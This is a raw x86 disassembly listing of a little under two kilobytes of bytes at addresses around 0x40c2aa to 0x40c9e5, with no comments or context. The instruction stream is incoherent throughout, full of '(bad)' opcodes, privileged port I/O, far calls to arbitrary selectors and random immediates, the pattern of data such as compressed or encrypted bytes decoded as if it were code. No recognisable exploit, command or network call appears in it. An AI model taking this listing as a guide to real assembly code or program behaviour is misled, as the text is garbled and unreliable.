  40c2aa:	adc    edi,DWORD PTR [eax+0x11]
  40c2ad:	js     0x40c286
  40c2af:	popf   
  40c2b0:	fadd   DWORD PTR [edi]
  40c2b2:	adc    esi,ecx
  40c2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b5:	sbb    DWORD PTR [edx-0x2],esi
  40c2b8:	repz push ss
  40c2ba:	and    eax,0x693e58fd
  40c2bf:	test   DWORD PTR [ebp-0x34435ba0],ebx
  40c2c5:	lahf   
  40c2c6:	and    bh,al
  40c2c8:	add    edx,DWORD PTR [ebx+0x18]
  40c2cb:	call   0x488a87b3
  40c2d0:	ins    DWORD PTR es:[edi],dx
  40c2d1:	cmp    DWORD PTR [ecx],eax
  40c2d3:	into   
  40c2d4:	jb     0x40c32d
  40c2d6:	inc    esp
  40c2d7:	cs or  esi,DWORD PTR gs:[eax]
  40c2db:	sahf   
  40c2dc:	les    eax,FWORD PTR [edi-0x3160691e]
  40c2e2:	xchg   edi,eax
  40c2e3:	mov    edx,0x897dffe
  40c2e8:	add    DWORD PTR [esp+esi*1+0x6722ff53],esi
  40c2ef:	sub    DWORD PTR [ebx-0x15382eb6],edi
  40c2f5:	jg     0x40c279
  40c2f7:	test   DWORD PTR [edi+0x75],edx
  40c2fa:	pusha  
  40c2fb:	inc    ecx
  40c2fc:	sub    DWORD PTR [bp+si],esp
  40c2ff:	sar    DWORD PTR [ecx],1
  40c301:	add    eax,0x8e8e0ddf
  40c306:	inc    edi
  40c307:	ret    
  40c308:	pop    ss
  40c309:	fs dec eax
  40c30b:	pop    es
  40c30c:	fcmovnu st,st(1)
  40c30e:	das    
  40c30f:	ja     0x40c2e8
  40c311:	cmp    esi,DWORD PTR [ecx+eiz*8]
  40c314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c315:	lods   eax,DWORD PTR ss:[esi]
  40c317:	bound  eax,QWORD PTR [edi+0x52]
  40c31a:	call   0xe0fc15d9
  40c31f:	xchg   esi,eax
  40c320:	jae    0x40c2e6
  40c322:	xor    edi,ebp
  40c324:	inc    edx
  40c325:	and    esp,eax
  40c327:	mov    edx,0x4bb22f26
  40c32c:	mov    esp,0xea3e3728
  40c331:	popa   
  40c332:	popa   
  40c333:	jg     0x40c2c4
  40c335:	cmc    
  40c336:	int    0x89
  40c338:	push   esi
  40c339:	ss aas 
  40c33b:	jae    0x40c384
  40c33d:	pop    ds
  40c33e:	xchg   esp,eax
  40c33f:	and    ch,dl
  40c341:	cld    
  40c342:	in     eax,dx
  40c343:	mov    dh,0x4c
  40c345:	mov    eax,ds:0xbe3fc0c8
  40c34a:	in     al,dx
  40c34b:	xor    bl,BYTE PTR ds:[ebx-0x73]
  40c34f:	sti    
  40c350:	jnp    0x40c334
  40c352:	jnp    0x40c34a
  40c354:	dec    ebx
  40c355:	into   
  40c356:	inc    esp
  40c357:	imul   esp,DWORD PTR [ebx+0x3d],0x10
  40c35b:	js     0x40c3c9
  40c35d:	mov    ah,0xd3
  40c35f:	into   
  40c360:	(bad)  
  40c361:	addr16 es iret 
  40c364:	fisub  DWORD PTR [ebp+0x342014a]
  40c36a:	jb     0x40c329
  40c36c:	mov    ebx,0xb4aa1075
  40c371:	adc    BYTE PTR [eax],al
  40c373:	fsqrt  
  40c375:	outs   dx,BYTE PTR ds:[esi]
  40c376:	out    dx,eax
  40c377:	cwde   
  40c378:	aas    
  40c379:	mov    bl,0x52
  40c37b:	push   0x3439cc2
  40c380:	out    dx,eax
  40c381:	sub    ch,bl
  40c383:	lods   al,BYTE PTR ds:[esi]
  40c384:	mov    eax,ds:0x179cd62b
  40c389:	mov    ecx,0xf957622c
  40c38e:	push   ds
  40c38f:	adc    BYTE PTR [ebp-0x24],0x46
  40c393:	or     BYTE PTR [esi-0x73],0xbd
  40c397:	in     eax,0xd2
  40c399:	popa   
  40c39a:	and    BYTE PTR [ebx+0x21271413],ch
  40c3a0:	mov    ecx,0xd44a59d0
  40c3a5:	call   0x10e7:0x26e91923
  40c3ac:	add    ebx,DWORD PTR [esi+edx*4+0x15a44939]
  40c3b3:	adc    DWORD PTR [eax+0x69eddcc1],edi
  40c3b9:	inc    eax
  40c3ba:	push   eax
  40c3bb:	xor    eax,0x3c7b3188
  40c3c0:	outs   dx,BYTE PTR ds:[esi]
  40c3c1:	jecxz  0x40c3c6
  40c3c3:	test   bh,ah
  40c3c5:	sbb    eax,0x269240aa
  40c3ca:	mov    ch,0xd6
  40c3cc:	inc    esp
  40c3cd:	in     al,0xc7
  40c3cf:	hlt    
  40c3d0:	mov    ebp,0xbcbd0e4d
  40c3d5:	pop    ss
  40c3d6:	pop    ebx
  40c3d7:	sbb    eax,0x10438d19
  40c3dc:	retf   0x3193
  40c3df:	in     al,0x1d
  40c3e1:	gs cmp al,0x4a
  40c3e4:	pop    edi
  40c3e5:	jnp    0x40c3ff
  40c3e7:	addr16 pop edx
  40c3e9:	xchg   esi,eax
  40c3ea:	xchg   BYTE PTR [eax+esi*2+0x70e87f24],al
  40c3f1:	sbb    DWORD PTR [esi-0x47],edx
  40c3f4:	inc    ebp
  40c3f5:	mov    dh,0x56
  40c3f7:	into   
  40c3f8:	sar    DWORD PTR [edi-0x3272fee8],1
  40c3fe:	jnp    0x40c444
  40c400:	outs   dx,DWORD PTR ds:[esi]
  40c401:	in     eax,0xa7
  40c403:	mov    esp,0xe73c260c
  40c408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c409:	arpl   WORD PTR [ecx+0x1a307c9e],cx
  40c40f:	aas    
  40c410:	xchg   edx,eax
  40c411:	sub    eax,0xcd192ef1
  40c416:	sub    BYTE PTR [ebx-0x40],0xfe
  40c41a:	mov    bh,0x67
  40c41c:	and    eax,0xeb40110d
  40c421:	xchg   esi,eax
  40c422:	adc    eax,esp
  40c424:	(bad)  
  40c425:	in     al,0x27
  40c427:	in     eax,dx
  40c428:	pop    ss
  40c429:	pop    esi
  40c42a:	jb     0x40c48c
  40c42c:	mov    ss,WORD PTR [edx]
  40c42e:	adc    BYTE PTR [ebp+0x61],dl
  40c431:	dec    edx
  40c432:	dec    ecx
  40c433:	sub    BYTE PTR [ebx+edi*2-0x60],dh
  40c437:	inc    edi
  40c438:	outs   dx,BYTE PTR ds:[esi]
  40c439:	mov    bl,0x1f
  40c43b:	cmp    BYTE PTR ds:0xf4a3940,al
  40c441:	fiadd  WORD PTR fs:[eax+0x13]
  40c445:	scas   al,BYTE PTR es:[edi]
  40c446:	sbb    eax,0xf28cd735
  40c44b:	scas   al,BYTE PTR es:[edi]
  40c44c:	data16 sahf 
  40c44e:	fldcw  WORD PTR ds:0xa310c118
  40c454:	ficomp DWORD PTR [esp+ecx*1+0x20]
  40c458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c459:	gs jnp 0x40c430
  40c45c:	cmp    ecx,ebp
  40c45e:	push   ss
  40c45f:	ins    BYTE PTR es:[edi],dx
  40c460:	mov    ch,0xd
  40c462:	dec    ebx
  40c463:	add    DWORD PTR [esi+0x40aa0916],ecx
  40c469:	push   ebx
  40c46a:	cli    
  40c46b:	fmul   QWORD PTR [edx+ebx*2]
  40c46e:	ds bnd jl 0x40c468
  40c472:	sti    
  40c473:	and    al,0x3e
  40c475:	sbb    eax,0xc1ccd6fe
  40c47a:	pop    eax
  40c47b:	shr    ebp,cl
  40c47d:	add    al,0x9a
  40c47f:	pop    ebp
  40c480:	cmp    al,0xbb
  40c482:	stc    
  40c483:	ins    DWORD PTR es:[edi],dx
  40c484:	rol    DWORD PTR [edi],cl
  40c486:	retf   
  40c487:	jmp    0x40c4b0
  40c489:	pop    edi
  40c48a:	mov    ebp,0x9fe10fcc
  40c48f:	xor    eax,0x15841c5a
  40c494:	mov    al,0xf9
  40c496:	out    0xef,eax
  40c498:	xchg   edx,eax
  40c499:	aaa    
  40c49a:	xchg   ebx,eax
  40c49b:	mov    ecx,0xfbf9651a
  40c4a0:	(bad)  
  40c4a2:	adc    ecx,DWORD PTR [eax-0x4e0a4cf2]
  40c4a8:	cmp    ah,BYTE PTR [edx+eiz*1-0x25]
  40c4ac:	arpl   WORD PTR [edi+0x3a],cx
  40c4af:	aam    0x54
  40c4b1:	sbb    esi,edx
  40c4b3:	or     al,BYTE PTR [ecx-0x64f46740]
  40c4b9:	sti    
  40c4ba:	xchg   cl,bh
  40c4bc:	inc    eax
  40c4bd:	pop    ss
  40c4be:	loopne 0x40c522
  40c4c0:	dec    edx
  40c4c1:	push   ds
  40c4c2:	outs   dx,DWORD PTR ds:[esi]
  40c4c3:	xor    dh,BYTE PTR [ebx+0x1b]
  40c4c6:	fbld   TBYTE PTR [eax+0x35]
  40c4c9:	xor    cl,BYTE PTR [esp+edx*4]
  40c4cc:	push   ebp
  40c4cd:	out    dx,al
  40c4ce:	mul    BYTE PTR [esi-0x33]
  40c4d1:	call   0xa87e:0x966aee46
  40c4d8:	pop    ecx
  40c4d9:	dec    ebp
  40c4da:	scas   eax,DWORD PTR es:[edi]
  40c4db:	ss dec ebp
  40c4dd:	push   eax
  40c4de:	ret    
  40c4df:	in     al,dx
  40c4e0:	lea    ebp,[eax+0x51]
  40c4e3:	gs cmp eax,0x9277c3e6
  40c4e9:	mov    ebp,0x79542ba9
  40c4ee:	retf   
  40c4ef:	test   BYTE PTR [ebp+0x6646dcb2],al
  40c4f5:	xchg   BYTE PTR [ecx],cl
  40c4f7:	sub    edi,DWORD PTR [edx+0x65]
  40c4fa:	rcr    BYTE PTR [ebp+0x4],1
  40c4fd:	jl     0x40c4ef
  40c4ff:	and    bl,BYTE PTR [eax]
  40c501:	dec    edi
  40c502:	push   edi
  40c503:	out    0xb1,eax
  40c505:	and    cl,BYTE PTR [ebx+0xf1cf0d]
  40c50b:	(bad)  
  40c50c:	rcr    bh,0xfb
  40c50f:	jle    0x40c55f
  40c511:	mov    BYTE PTR [ecx+0x44797c96],dh
  40c517:	dec    eax
  40c518:	jb     0x40c49d
  40c51a:	push   si
  40c51c:	das    
  40c51d:	jbe    0x40c585
  40c51f:	pop    eax
  40c520:	mov    WORD PTR ds:0xed7d31ba,?
  40c526:	jne    0x40c575
  40c528:	push   ss
  40c529:	xor    bl,bh
  40c52b:	add    al,0x5
  40c52d:	ins    DWORD PTR es:[di],dx
  40c52f:	addr16 pop es
  40c531:	lods   al,BYTE PTR ds:[esi]
  40c532:	pop    edx
  40c533:	mov    edi,edx
  40c535:	popf   
  40c536:	call   0x4925beb0
  40c53b:	aas    
  40c53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53d:	pop    ecx
  40c53e:	out    0x82,eax
  40c540:	and    cl,BYTE PTR ds:0xa5241a17
  40c546:	(bad)  
  40c548:	or     dl,0x94
  40c54b:	fnstsw WORD PTR [esi+0x59]
  40c54e:	mov    bh,0x19
  40c550:	jmp    0x40c55f
  40c552:	in     eax,0x3c
  40c554:	sbb    eax,0x959110fa
  40c559:	(bad)  
  40c55a:	cmp    edi,DWORD PTR [edi-0x184e86b]
  40c560:	fcom   st(5)
  40c562:	inc    ebx
  40c563:	scas   eax,DWORD PTR es:[edi]
  40c564:	fdiv   st(1),st
  40c566:	xchg   esp,eax
  40c567:	dec    esp
  40c568:	push   eax
  40c569:	int    0xe1
  40c56b:	inc    edx
  40c56c:	into   
  40c56d:	sti    
  40c56e:	mov    dh,0xd3
  40c570:	push   cs
  40c571:	cmp    DWORD PTR [ebx],ebp
  40c573:	in     eax,0x98
  40c575:	pusha  
  40c576:	sub    eax,0xc23467e
  40c57b:	mov    ebx,0x5b72d58e
  40c580:	shl    DWORD PTR [esi],0xfb
  40c583:	es mov dl,0x71
  40c586:	dec    edx
  40c587:	jg     0x40c582
  40c589:	out    dx,al
  40c58a:	or     eax,0x34415d02
  40c58f:	repnz push ecx
  40c591:	pop    ss
  40c592:	jns    0x40c5ed
  40c594:	mov    ds,edi
  40c596:	inc    ecx
  40c597:	sar    DWORD PTR [edx+edi*1-0x589204b5],0x57
  40c59f:	push   ebp
  40c5a0:	inc    esp
  40c5a1:	inc    edi
  40c5a2:	mov    esp,0xf0cc2d8
  40c5a7:	retf   
  40c5a8:	or     eax,DWORD PTR [ebx+0x40]
  40c5ab:	mov    dl,0xd4
  40c5ad:	xor    esp,DWORD PTR [ecx-0x3518354]
  40c5b3:	inc    esi
  40c5b4:	pop    DWORD PTR [ebx-0x2a]
  40c5b7:	dec    esi
  40c5b8:	inc    ebx
  40c5b9:	cmp    bh,ch
  40c5bb:	fld    TBYTE PTR [ebx-0x7e]
  40c5be:	push   esp
  40c5bf:	imul   ebp,DWORD PTR [ecx-0x6c668487],0x724be3c2
  40c5c9:	fidiv  WORD PTR [edx-0x5b]
  40c5cc:	call   0x1bdb4537
  40c5d1:	test   eax,0x39474ce6
  40c5d6:	lods   eax,DWORD PTR ds:[esi]
  40c5d7:	sub    eax,0x86e1b4e7
  40c5dc:	shr    BYTE PTR [esi+0x1353a37f],cl
  40c5e2:	sti    
  40c5e3:	pop    edi
  40c5e4:	inc    ecx
  40c5e5:	and    al,0xae
  40c5e7:	mov    bl,0x46
  40c5e9:	cmp    eax,0x325ef00e
  40c5ee:	xor    ah,bh
  40c5f0:	jbe    0x40c64c
  40c5f2:	cmp    eax,0x6a6f23b0
  40c5f7:	cld    
  40c5f8:	xchg   ecx,eax
  40c5f9:	ret    
  40c5fa:	stos   DWORD PTR es:[edi],eax
  40c5fb:	in     eax,dx
  40c5fc:	imul   edi,DWORD PTR [ebp-0x78e7d01b],0x53f324cf
  40c606:	ror    BYTE PTR [ebx+0x73ffdc35],0x1b
  40c60d:	fidiv  DWORD PTR [esp+edx*8]
  40c610:	nop
  40c611:	sub    al,0xba
  40c613:	push   ebx
  40c614:	sbb    DWORD PTR [ebx],edi
  40c616:	inc    ebp
  40c617:	shl    DWORD PTR [ecx],1
  40c619:	xchg   edx,eax
  40c61a:	mov    esi,0xf2e19bb5
  40c61f:	dec    ebp
  40c620:	or     eax,0x96b62e85
  40c625:	fwait
  40c626:	or     ecx,DWORD PTR [edi]
  40c628:	xchg   DWORD PTR [esi+eax*8+0x9f4d8a],ebp
  40c62f:	mov    bl,0xde
  40c631:	ret    0xdccb
  40c634:	push   fs
  40c636:	in     al,dx
  40c637:	cwde   
  40c638:	mov    dh,0x56
  40c63a:	sub    ebp,ebx
  40c63c:	cmp    BYTE PTR [eax-0x63],cl
  40c63f:	ds stos DWORD PTR es:[edi],eax
  40c641:	ja     0x40c65f
  40c643:	mov    esp,0xdd3d28d3
  40c648:	stc    
  40c649:	out    dx,eax
  40c64a:	pop    es
  40c64b:	or     ah,cl
  40c64d:	jge    0x40c635
  40c64f:	mov    bl,0xd9
  40c651:	in     al,dx
  40c652:	mov    eax,0x5d233c3c
  40c657:	aaa    
  40c658:	fwait
  40c659:	jne    0x40c674
  40c65b:	cmp    DWORD PTR [edx],ebx
  40c65d:	push   ebx
  40c65e:	hlt    
  40c65f:	imul   edx,DWORD PTR ds:[ecx+0x715f50a2],0xcdae3ceb
  40c66a:	sub    cl,BYTE PTR [ecx]
  40c66c:	xor    al,0x6e
  40c66e:	pusha  
  40c66f:	mov    bh,0x4d
  40c671:	jnp    0x40c69f
  40c673:	aad    0x1
  40c675:	cdq    
  40c676:	ret    
  40c677:	inc    ebp
  40c678:	leave  
  40c679:	and    al,0x3c
  40c67b:	ret    
  40c67c:	int3   
  40c67d:	mov    al,ds:0x6ab67e53
  40c682:	sahf   
  40c683:	push   cs
  40c684:	arpl   bx,dx
  40c686:	pop    ebx
  40c687:	das    
  40c688:	jmp    0x40c6c8
  40c68a:	cmp    bh,ch
  40c68c:	shl    BYTE PTR [eax],1
  40c68e:	sub    edi,edi
  40c690:	mov    ebp,0x472dcaae
  40c695:	push   ebp
  40c696:	add    eax,0xb23da1fc
  40c69b:	inc    ecx
  40c69c:	ins    BYTE PTR es:[edi],dx
  40c69d:	inc    ebx
  40c69e:	push   ds
  40c69f:	daa    
  40c6a0:	call   0x1364d711
  40c6a5:	xchg   esp,eax
  40c6a6:	cwde   
  40c6a7:	mov    al,BYTE PTR ds:0x708ede7a
  40c6ad:	popf   
  40c6ae:	inc    ebx
  40c6af:	(bad)  
  40c6b0:	out    dx,eax
  40c6b1:	pop    ss
  40c6b2:	xchg   esp,eax
  40c6b3:	jbe    0x385d7033
  40c6b9:	icebp  
  40c6ba:	mov    ds,WORD PTR [ebx+0x7c940033]
  40c6c0:	(bad)  [esi+0x50]
  40c6c3:	pop    ebp
  40c6c4:	das    
  40c6c5:	xor    BYTE PTR [esi+0xd4e76d1],al
  40c6cb:	jge    0x40c67a
  40c6cd:	loop   0x40c727
  40c6cf:	jp     0x40c6cc
  40c6d1:	push   0x34
  40c6d3:	in     eax,dx
  40c6d4:	mov    ebx,0x143ac8a0
  40c6d9:	jl     0x40c6cb
  40c6db:	add    esp,edi
  40c6dd:	rcr    dl,1
  40c6df:	mov    cl,0x6e
  40c6e1:	js     0x40c742
  40c6e3:	ins    DWORD PTR es:[edi],dx
  40c6e4:	lods   al,BYTE PTR ds:[esi]
  40c6e5:	jbe    0x40c698
  40c6e7:	and    dl,al
  40c6e9:	nop
  40c6ea:	sbb    al,0xe7
  40c6ec:	inc    eax
  40c6ed:	dec    ebx
  40c6ee:	loope  0x40c752
  40c6f0:	out    0x9c,eax
  40c6f2:	mov    eax,0xc8a7f4f6
  40c6f7:	jno    0x40c69c
  40c6f9:	fisub  DWORD PTR [ebx]
  40c6fb:	test   al,0x1f
  40c6fd:	and    BYTE PTR [eax+0x3ea96b4c],bh
  40c703:	cmp    DWORD PTR [ecx-0x2d],0x841e7efd
  40c70a:	cli    
  40c70b:	bound  eax,QWORD PTR [eax-0x1a154f89]
  40c711:	outs   dx,BYTE PTR ds:[esi]
  40c712:	sbb    esp,DWORD PTR [esi+0xa]
  40c715:	or     ebp,DWORD PTR [ecx-0x70ca26bf]
  40c71b:	data16 jle 0x40c721
  40c71e:	ins    BYTE PTR es:[edi],dx
  40c71f:	lea    eax,[edi+0x1a]
  40c722:	xlat   BYTE PTR ds:[ebx]
  40c723:	jno    0x40c76a
  40c725:	mov    WORD PTR [ebp+0x3098a13f],cs
  40c72b:	int3   
  40c72c:	in     eax,0xd2
  40c72e:	adc    ebx,DWORD PTR [esp+eax*1+0x651f3b94]
  40c735:	nop
  40c736:	cmp    eax,DWORD PTR [ecx+0x1ed26a1f]
  40c73c:	mov    dh,0x6
  40c73e:	or     cl,BYTE PTR [ebx+0x293ba283]
  40c744:	mov    cl,BYTE PTR [ebx+0x6c]
  40c747:	mov    eax,ds:0x6c16e14a
  40c74c:	mov    esi,0xf1419382
  40c751:	das    
  40c752:	popf   
  40c753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c754:	jb     0x40c73e
  40c756:	(bad)  [edx+0x69643c2b]
  40c75c:	xchg   ebp,eax
  40c75d:	mov    al,0x99
  40c75f:	das    
  40c760:	clc    
  40c761:	jle    0x40c6ed
  40c763:	cdq    
  40c764:	scas   eax,DWORD PTR es:[edi]
  40c765:	xor    al,0xb3
  40c767:	(bad)  
  40c768:	not    DWORD PTR [ecx+0x30]
  40c76b:	add    dl,BYTE PTR ds:0xa0499b2a
  40c771:	xchg   ecx,eax
  40c772:	ret    0x13e1
  40c775:	es ins DWORD PTR es:[edi],dx
  40c777:	pop    ss
  40c778:	add    eax,0x7c8ad9ea
  40c77d:	cwde   
  40c77e:	jbe    0x40c7f8
  40c780:	mov    eax,ds:0xce5fe00a
  40c785:	aad    0x17
  40c787:	ins    BYTE PTR es:[edi],dx
  40c788:	sahf   
  40c789:	stos   DWORD PTR es:[edi],eax
  40c78a:	xchg   esp,eax
  40c78b:	jge    0x40c754
  40c78d:	test   esi,eax
  40c78f:	imul   ebp,DWORD PTR [ebx+0x7a],0xffffffe3
  40c793:	push   ss
  40c794:	jl     0x40c7e2
  40c796:	jge    0x40c73a
  40c798:	fcmovnb st,st(4)
  40c79a:	cwde   
  40c79b:	int3   
  40c79c:	cmp    eax,ecx
  40c79e:	imul   eax,DWORD PTR [esi+0x6b],0x2b
  40c7a2:	iret   
  40c7a3:	test   BYTE PTR [ebp-0x2759c72c],cl
  40c7a9:	cdq    
  40c7aa:	mov    edi,0x90d4644a
  40c7af:	jno    0x40c7ae
  40c7b1:	stos   BYTE PTR es:[edi],al
  40c7b2:	push   ss
  40c7b3:	ds int 0xa7
  40c7b6:	xchg   ebx,eax
  40c7b7:	(bad)  
  40c7b8:	push   edx
  40c7b9:	sbb    al,0x2c
  40c7bb:	inc    ebx
  40c7bc:	cdq    
  40c7bd:	jmp    DWORD PTR [ebx+0x34834fb5]
  40c7c3:	js     0x40c7f0
  40c7c5:	mov    ds:0xc348ba97,eax
  40c7ca:	mov    ch,0xa9
  40c7cc:	inc    esp
  40c7cd:	push   ss
  40c7ce:	std    
  40c7cf:	out    0x61,eax
  40c7d1:	ss jnp 0x40c7a2
  40c7d4:	jns    0x40c7de
  40c7d6:	pop    edi
  40c7d7:	jno    0x40c75d
  40c7d9:	ret    0xd5d6
  40c7dc:	mov    eax,edx
  40c7de:	pop    esi
  40c7df:	int    0x2
  40c7e1:	cmp    eax,0x3d2ec842
  40c7e6:	iret   
  40c7e7:	push   esp
  40c7e8:	push   ss
  40c7e9:	call   DWORD PTR [esi+ebp*4]
  40c7ec:	xor    BYTE PTR [esi+0x47],bh
  40c7ef:	(bad)  
  40c7f0:	fidiv  DWORD PTR [esi-0x6e]
  40c7f3:	pop    edx
  40c7f4:	xchg   esi,eax
  40c7f5:	and    ebp,ebp
  40c7f7:	or     esi,DWORD PTR [eax]
  40c7f9:	pop    ecx
  40c7fa:	mov    DWORD PTR [ebp-0x75],esi
  40c7fd:	pop    ebx
  40c7fe:	sti    
  40c7ff:	add    al,0x7d
  40c801:	and    BYTE PTR [edx+ecx*4+0x7f],dl
  40c805:	adc    al,0xf4
  40c807:	push   ecx
  40c808:	jbe    0x40c7f8
  40c80a:	adc    DWORD PTR [esi-0x69],0x4f
  40c80e:	inc    edi
  40c80f:	pop    edx
  40c810:	dec    ecx
  40c811:	mov    esi,0x27116556
  40c816:	pop    esi
  40c817:	xor    al,0x9e
  40c819:	mov    al,0xc
  40c81b:	cdq    
  40c81c:	ins    DWORD PTR es:[edi],dx
  40c81d:	hlt    
  40c81e:	daa    
  40c81f:	lahf   
  40c820:	push   edx
  40c821:	pop    esp
  40c822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c823:	mov    edx,0x9877ea3a
  40c828:	xchg   ebx,edx
  40c82a:	sbb    BYTE PTR [ebx-0x7c59170f],0x6d
  40c831:	add    esi,DWORD PTR [eax+0x41]
  40c834:	push   esp
  40c835:	stc    
  40c836:	push   esi
  40c837:	jb     0x40c869
  40c839:	jbe    0x40c7dd
  40c83b:	and    DWORD PTR [ecx],edi
  40c83d:	leave  
  40c83e:	pop    ebx
  40c83f:	dec    ebx
  40c840:	enter  0x7896,0x4
  40c844:	pop    ss
  40c845:	mov    esi,0xadd1e77e
  40c84a:	sti    
  40c84b:	dec    ebx
  40c84c:	jmp    0xc4c883b8
  40c851:	outs   dx,BYTE PTR ds:[esi]
  40c852:	call   0x7c30:0x80dc7dc7
  40c859:	pop    ds
  40c85a:	ja     0x40c7f7
  40c85c:	sub    al,BYTE PTR [ebx]
  40c85e:	and    dl,dh
  40c860:	push   ss
  40c861:	mov    ds:0x302ec780,al
  40c866:	loop   0x40c85f
  40c868:	mov    edx,0x446ae5ae
  40c86d:	scas   al,BYTE PTR es:[edi]
  40c86e:	(bad)  [ebx]
  40c870:	test   eax,0xfaf1fdbe
  40c875:	fs inc esp
  40c877:	dec    BYTE PTR [edi+ebp*1]
  40c87a:	push   ss
  40c87b:	adc    eax,0xb166629f
  40c880:	js     0x40c8a8
  40c882:	pop    ss
  40c883:	xchg   ecx,eax
  40c884:	mov    ecx,0xa85f24e5
  40c889:	cmc    
  40c88a:	add    DWORD PTR [eax-0x220a0bac],esp
  40c890:	outs   dx,BYTE PTR ds:[esi]
  40c891:	fs out 0x84,eax
  40c894:	mov    BYTE PTR [ecx-0x49],0x2d
  40c898:	mov    edi,0x187ecae5
  40c89d:	mov    ch,0x21
  40c89f:	jg     0x40c825
  40c8a1:	std    
  40c8a2:	gs dec edi
  40c8a4:	pushf  
  40c8a5:	sbb    DWORD PTR [eax],edx
  40c8a7:	add    al,BYTE PTR [edx+eax*8+0x4927b77f]
  40c8ae:	repnz aas 
  40c8b0:	jl     0x40c836
  40c8b2:	add    al,0xd2
  40c8b4:	lods   al,BYTE PTR ds:[esi]
  40c8b5:	ins    DWORD PTR es:[edi],dx
  40c8b6:	cmp    al,0xa7
  40c8b8:	ins    DWORD PTR es:[edi],dx
  40c8b9:	push   ebp
  40c8ba:	test   bl,bh
  40c8bc:	rcr    BYTE PTR [ebx],cl
  40c8be:	in     eax,dx
  40c8bf:	xchg   edi,eax
  40c8c0:	or     ah,ah
  40c8c2:	je     0x40c938
  40c8c4:	mov    DWORD PTR [edi+0x622899a6],esi
  40c8ca:	fwait
  40c8cb:	and    BYTE PTR ds:0x5118da83,0xd1
  40c8d2:	pop    ebp
  40c8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d5:	xchg   esi,eax
  40c8d6:	add    DWORD PTR [esi+ecx*4+0x47b7fa1],edi
  40c8dd:	int    0xb3
  40c8df:	xlat   BYTE PTR ds:[ebx]
  40c8e0:	sar    ebx,1
  40c8e2:	pop    ss
  40c8e3:	ins    DWORD PTR es:[edi],dx
  40c8e4:	clc    
  40c8e5:	out    0x57,eax
  40c8e7:	sbb    al,0x50
  40c8e9:	or     dh,BYTE PTR [eax-0x50]
  40c8ec:	adc    DWORD PTR [ebx+0x8321bbc],esp
  40c8f2:	push   ecx
  40c8f3:	cmp    eax,0xd78cd4f8
  40c8f8:	or     eax,0x683ddb90
  40c8fd:	mov    bh,0x40
  40c8ff:	mov    dl,0xb6
  40c901:	sub    dl,BYTE PTR [edi-0x4c1c52f]
  40c907:	mov    ecx,0x50324814
  40c90c:	fadd   QWORD PTR [ecx]
  40c90e:	xor    eax,0x9eb3d56c
  40c913:	add    al,0x9e
  40c915:	add    DWORD PTR [eax+0x17a8bd3b],0xe4ba33c
  40c91f:	dec    eax
  40c920:	jle    0x40c944
  40c922:	cmp    BYTE PTR [eax+0x22],cl
  40c925:	sub    dh,BYTE PTR [ecx-0x6a]
  40c928:	call   DWORD PTR [ebx]
  40c92a:	add    al,0xee
  40c92c:	xor    al,0xaa
  40c92e:	push   ss
  40c92f:	cli    
  40c930:	ss inc edi
  40c932:	fcmovne st,st(6)
  40c934:	inc    ebp
  40c935:	into   
  40c936:	fwait
  40c937:	dec    BYTE PTR [ebx+0x24e3c811]
  40c93d:	call   0xfbd3:0xfcda70ff
  40c944:	shr    DWORD PTR [ebx-0x158e0315],1
  40c94a:	or     dh,BYTE PTR [esi-0x66]
  40c94d:	call   0x3680:0xbf88576a
  40c954:	mov    esp,0x6928f070
  40c959:	popf   
  40c95a:	and    ah,bh
  40c95c:	cli    
  40c95d:	lea    edx,[edi]
  40c95f:	popa   
  40c960:	push   eax
  40c961:	aas    
  40c962:	repz popf 
  40c964:	and    cl,al
  40c966:	js     0x40c918
  40c968:	inc    ecx
  40c969:	lds    ebx,FWORD PTR [ecx]
  40c96b:	cmc    
  40c96c:	lods   al,BYTE PTR ds:[esi]
  40c96d:	jmp    0x40c993
  40c96f:	fsubp  st(3),st
  40c971:	adc    dh,dl
  40c973:	fisttp DWORD PTR [eax+0x26]
  40c976:	int    0x9e
  40c978:	jns    0x40c9e0
  40c97a:	js     0x40c9af
  40c97c:	jbe    0x40c967
  40c97e:	sub    BYTE PTR [edi],al
  40c980:	mov    al,ds:0x62796012
  40c985:	sub    DWORD PTR [ebx],0xffffffe9
  40c988:	jecxz  0x40c9df
  40c98a:	stos   BYTE PTR es:[edi],al
  40c98b:	push   0xf624fab5
  40c990:	lock mul BYTE PTR [bp-0x5533]
  40c996:	outs   dx,DWORD PTR ds:[esi]
  40c997:	jne    0x40c976
  40c999:	push   es
  40c99a:	adc    BYTE PTR [edi+0x6b],0xae
  40c99e:	xchg   ebp,eax
  40c99f:	ret    
  40c9a0:	icebp  
  40c9a1:	clc    
  40c9a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a3:	sub    DWORD PTR [ebx],0xffffffdf
  40c9a6:	push   cs
  40c9a7:	rol    BYTE PTR [edi+0x22147c0c],0x5a
  40c9ae:	outs   dx,BYTE PTR ds:[esi]
  40c9af:	call   0x2ab4b425
  40c9b4:	shr    BYTE PTR [edi-0x43e7798e],0xc4
  40c9bb:	bound  ecx,QWORD PTR [ebp-0x4ff3eafc]
  40c9c1:	pop    esi
  40c9c2:	das    
  40c9c3:	outs   dx,BYTE PTR ds:[esi]
  40c9c4:	lods   eax,DWORD PTR ds:[esi]
  40c9c5:	ret    0x16c5
  40c9c8:	hlt    
  40c9c9:	retf   
  40c9ca:	cdq    
  40c9cb:	xchg   esp,eax
  40c9cc:	or     BYTE PTR [ecx+0x4b],dl
  40c9cf:	xor    eax,DWORD PTR [ebx]
  40c9d1:	sub    al,0xdf
  40c9d3:	jle    0x40c99d
  40c9d5:	and    al,0xa3
  40c9d7:	push   es
  40c9d8:	inc    edx
  40c9d9:	pop    ds
  40c9da:	push   ebp
  40c9db:	dec    ebx
  40c9dc:	dec    esi
  40c9dd:	loop   0x40c962
  40c9df:	inc    ebx
  40c9e0:	add    ebp,eax
  40c9e2:	sub    ebp,DWORD PTR [edi]
  40c9e4:	xchg   edx,eax
  40c9e5:	cli    
